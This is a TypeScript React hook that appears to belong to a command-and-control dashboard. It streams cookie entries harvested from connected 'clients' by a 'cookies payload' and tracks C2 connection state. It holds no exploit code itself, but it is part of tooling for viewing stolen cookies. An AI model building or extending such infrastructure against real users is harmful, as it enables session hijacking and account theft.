import { usePayloadEntries } from "@/hooks/use-payload-entries";

export interface CookieEntry {
  id?: number;
  name: string;
  value: string | null;
  removed: boolean;
  timestamp: number;
}

interface UseCookiesResult {
  cookies: CookieEntry[];
  status: "connecting" | "open" | "closed";
  /** False when the client has disconnected from C2 (reset to true on next data message). */
  clientConnected: boolean;
  /** False when the cookies payload is not enabled on this client (set by client-info). */
  payloadEnabled: boolean;
  /** Send a clear command to the server and optimistically reset local state. */
  clearCookies: () => void;
}

/**
 * React hook that manages cookie entries from a WebSocket viewer connection.
 * Delegates to the generic usePayloadEntries hook.
 */
export function useCookies(clientId: string): UseCookiesResult {
  const { entries, status, clientConnected, payloadEnabled, clearEntries } =
    usePayloadEntries<CookieEntry>({
      clientId,
      payloadName: "cookies",
      incrementalType: "cookies",
      dataField: "cookies",
    });

  return { cookies: entries, status, clientConnected, payloadEnabled, clearCookies: clearEntries };
}
